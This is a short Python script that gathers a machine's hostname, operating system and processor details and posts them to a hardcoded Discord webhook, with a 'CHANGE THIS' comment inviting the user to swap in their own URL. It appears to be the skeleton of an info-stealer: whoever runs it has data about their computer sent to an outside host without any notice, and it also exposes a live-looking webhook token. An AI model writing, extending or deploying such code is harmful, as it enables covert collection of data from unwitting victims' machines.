import platform
import requests
import socket

webhook_url = "https://discord.com/api/webhooks/1387085009122230393/0HCbVbYaTG8iFmkk680dB-Fe9XLXYbJT1nPfpanMnaOmNmonY_EkPHm2prHc1AvdYpKz"  # CHANGE THIS

info = f"""
**PC Information**
Computer Name: {socket.gethostname()}
System: {platform.system()} {platform.release()}
Processor: {platform.processor()}
"""

data = {
    "content": info
}

requests.post(webhook_url, data=data)